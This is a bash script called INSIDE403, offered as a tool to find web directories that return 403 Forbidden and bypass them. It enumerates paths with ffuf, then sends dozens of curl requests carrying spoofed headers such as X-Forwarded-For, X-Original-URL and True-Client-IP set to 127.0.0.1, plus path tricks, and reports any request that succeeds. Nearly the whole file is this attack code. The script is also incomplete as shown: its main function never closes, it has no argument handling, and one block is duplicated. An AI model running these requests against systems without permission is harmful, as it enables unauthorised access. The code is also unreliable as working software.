#!/bin/bash

darkGray="\e[100m"
ltcyan="\e[96m"
lyellow="\e[93m"
yellow="\e[33m"
green="\e[32m"
dblue="\e[0;94m"
dred="\033[1;31m"
lblue="\e[96m"
lred="\033[31m"
reset="\e[0m"



#--------------------------Functions------------------------------#
#-----------------------------------------------------------------#


#forBanner
banner () {
    printf ""$lblue"
██╗███╗   ██╗███████╗██╗██████╗ ███████╗██╗  ██╗ ██████╗ ██████╗ 
██║████╗  ██║██╔════╝██║██╔══██╗██╔════╝██║  ██║██╔═████╗╚════██╗
██║██╔██╗ ██║███████╗██║██║  ██║█████╗  ███████║██║██╔██║ █████╔╝
██║██║╚██╗██║╚════██║██║██║  ██║██╔══╝  ╚════██║████╔╝██║ ╚═══██╗
██║██║ ╚████║███████║██║██████╔╝███████╗     ██║╚██████╔╝██████╔╝
╚═╝╚═╝  ╚═══╝╚══════╝╚═╝╚═════╝ ╚══════╝     ╚═╝ ╚═════╝ ╚═════╝ 
                                                                 
                                V1.0.0
                                Coded By Neh Patel with Love <3 ❤
    "$reset""


    printf ""$lred"
Twitter :-   https://twitter.com/thecyberneh
Instagram :- https://www.instagram.com/thecyberneh/
Linkedin :-  https://linkedin.com/in/thecyberneh
"$reset""
echo -e "\n"
}


#-----------------------------------------------------------------#


#for_print_INFO
fun_info () {
    echo -e "[${dblue}INFO${reset}]"
}


#-----------------------------------------------------------------#


#for_print_INIT
fun_init () {
    echo -e "[${dblue}INIT${reset}]"
}


#-----------------------------------------------------------------#


#for_print_FOUND
fun_found () {
    echo -e "[${lred}FOUND${reset}]"
}


#-----------------------------------------------------------------#


#forOpenHelpMenu
fun_openHelp () {
  echo -e "${lyellow}[ABOUT]${reset}"
  echo -e "   INSIDE403 is a tool to find directories which has 403 status code"
  echo -e "   and try to bypass it."
  echo -e "\n"
  echo -e "${lyellow}[Usage:]${reset}"
  echo -e "   inside403 [flags]"
  echo -e "\n"
  echo -e "${lyellow}[FLAGS:]${reset}"
  echo -e "${yellow}    [TARGET:]${reset}"
  echo -e "       -l, --list       target URLs/hosts to scan"
  echo -e "       -u, --url        Target URL+Directory to Scan"

  echo -e "${yellow}    [WORDLIST:]${reset}"
  echo -e "       -w, --wordlist    path of your wordlist"
  echo -e "\n"
  echo -e "${yellow}    [HELP:]${reset}"
  echo -e "       -h, --help    to get help menu" 
  echo -e "\n"
  echo -e "${lyellow}[Examples:]${reset}"
  echo -e "   Try to bypass 403 on directory:- 403here"
  echo -e "${lyellow}       inside403 -u https://sub.domain.tld/403here ${reset}"

  echo -e "\n"
  echo -e "   Try to find directories with 403 from URL list"
  echo -e "   with wordlist located at:- /path/to/wordlist.txt"
  echo -e "${lyellow}       inside403 -l httpxResults.txt -w /path/to/wordlist.txt ${reset}"
  echo -e "   You can use results from ${yellow}HTTPX tool${reset} as URL list"

  echo -e "\n"
  echo -e "   Run tool with default wordlist"
  echo -e "       Default wordlist at:- /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt"
  echo -e "${lyellow}       inside403 -l httpxResults.txt ${reset}"

 


}


#-----------------------------------------------------------------#


#for_GettingURl+Dir_With_403
fun_get403 () {
  touch 403of${input}
  while IFS= read -r line
  do
    echo -e "\n"
    echo -e "$(fun_init) Initializing 403 ENUMARATION with FFUF..."
    ffuf -v -w $wordlist -u ${line}/FUZZ -mc 403 |grep '| URL |' |awk -F '|' '{print $3}' >> 403of${input}
    echo -e "\n"
    echo -e "$(fun_info) All Directories with 403 status code are saved in file: 403of${input}"
    echo -e "\n"
    echo -e "\n"
  done < "$input"
}


#-----------------------------------------------------------------#


#for_print
fun_print () {
  status_code=$(echo ${code} | awk '{print $2}'|sed 's/,$//g')

  if [[ ${status_code} =~ 2.. ]];then
      printf "$(fun_found) ${lred}${code} ${reset} \n${payload}\n\n"
  elif [[ ${status_code} =~ 3.. ]]; then
      printf "${lyellow}${code} ${reset}\n\n"
  elif [[ ${status_code} =~ 5.. ]]; then
      printf "${dblue}${code} ${reset}\n\n"
  else
      printf "${lblue}${code} ${reset}\n\n"
  fi
}


#-----------------------------------------------------------------#



#for_bypass_from_list
fun_fromList (){
  F03File="403of${input}"
  while IFS= read -r line
  do
    target=`echo $line`
    fun_bypass
  done < "$F03File"
}


#-----------------------------------------------------------------#


#inside403_main_function
fun_bypass () {
  path=$(echo $target | cut -d "/" -f4- )
  mainUrl=$(echo $target | cut -d "/" -f3)

  echo -e "$(fun_info) Current Target is $target"
  echo -e "\n"

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Client-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Client-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-URL: /${path}" -X GET "${target}/anything" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Original-URL: /${path}' -X GET '${target}/anything' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Rewrite-URL: /${path}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Rewrite-URL: /${path}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Content-Length: 0" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Content-Length: 0' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-ProxyUser-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-ProxyUser-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Base-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Base-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Client-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Client-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Http-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Http-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  

    code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Destination: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Destination: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Proxy: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting_IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'CF-Connecting_IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "CF-Connecting-IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'CF-Connecting-IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referer: ${target}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Referer: ${target}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Custom-IP-Authorization: 127.0.0.1" -X GET "${target}..;/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET '${target}..;/' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Originating-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-IP: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Remote-IP: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")

  payload=$(printf "curl -ks -H 'X-Originally-Forwarded-For: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Originating-: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Originating-IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Originating-IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "True-Client-IP: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'True-Client-IP: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-WAP-Profile: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-WAP-Profile: 127.0.0.1, 68.180.194.242" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-WAP-Profile: 127.0.0.1, 68.180.194.242' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Profile: http://${mainUrl}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Profile: http://${mainUrl}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Arbitrary: http://${mainUrl}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Arbitrary: http://${mainUrl}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-HTTP-DestinationURL: http://${mainUrl}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-HTTP-DestinationURL: http://${mainUrl}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Proto: http://${mainUrl}" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Proto: http://${mainUrl}' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Host: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Proxy-Host: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Proxy-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Proxy-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Real-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Real-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Redirect: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Redirect: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Referrer: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Referrer: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Request-Uri: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Request-Uri: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Uri: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Uri: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forward-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forward-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-By: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-By: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-For-Original: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-For-Original: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded-Server: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded-Server: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarded: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarded: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Forwarder-For: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Forwarder-For: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Destinationurl: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Http-Destinationurl: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Http-Host-Override: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  payload=$(printf "curl -ks -H 'X-Http-Host-Override: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print
  
  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Original-Remote-Addr: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Original-Remote-Addr: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Proxy-Url: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Proxy-Url: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Real-Ip: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Real-Ip: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-Remote-Addr: 127.0.0.1" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-Remote-Addr: 127.0.0.1' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

  code=$(curl -ks -o /dev/null -i -w 'Status: ''%{http_code}',' Length : '"%{size_download}\n" -H "X-OReferrer: https%3A%2F%2Fwww.google.com%2F" -X GET "${target}" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36")
  
  payload=$(printf "curl -ks -H 'X-OReferrer: https%3A%2F%2Fwww.google.com%2F' -X GET '${target}' -H 'User-Agent: Mozilla/5.0'")
  fun_print

